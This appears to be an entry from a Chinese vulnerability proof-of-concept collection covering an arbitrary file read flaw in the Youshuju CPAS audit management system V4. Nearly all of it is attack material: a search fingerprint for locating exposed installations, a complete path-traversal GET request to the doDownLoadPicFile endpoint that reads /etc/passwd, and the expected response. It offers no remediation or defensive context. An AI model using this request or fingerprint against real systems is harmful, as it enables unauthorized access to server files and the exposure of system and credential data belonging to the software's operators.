# 友数聚CPAS审计管理系统V4doDownLoadPicFile任意文件读取漏洞

友数聚CPAS审计管理系统V4doDownLoadPicFile ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/cpasm4/static/cap/font/iconfont.css"`
- **请求**：`GET /cpasm4/static/..;/mobileUploadPictureController/doDownLoadPicFile?picPath=/etc/passwd&fileType=1 HTTP/1.1`
- **响应特征**：200